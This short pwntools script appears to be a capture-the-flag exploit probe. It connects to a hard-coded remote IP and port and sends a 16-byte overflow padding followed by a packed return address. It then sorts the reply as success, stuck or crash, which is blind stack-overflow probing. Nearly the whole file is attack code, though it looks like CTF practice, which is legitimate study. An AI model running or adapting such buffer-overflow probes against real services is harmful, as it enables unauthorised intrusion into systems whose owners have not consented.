from pwn import*
context.log_level = 'debug'
def probe(payload): 
    try:
        p=remote('123.59.196.133',10057)
        p.recvuntil('TNT!\n')
        p.send(payload)
        res=p.recv(timeout=3)
        if b"TNT" in res:
            return "success"
        else:
            return "stuck"
    except:
        return "crash"
p=remote('123.59.196.133',10057)
#p.send(b'a'*16+b'\xb0')
print(probe(b'a'*16+p64(0x6000ce)))
p.interactive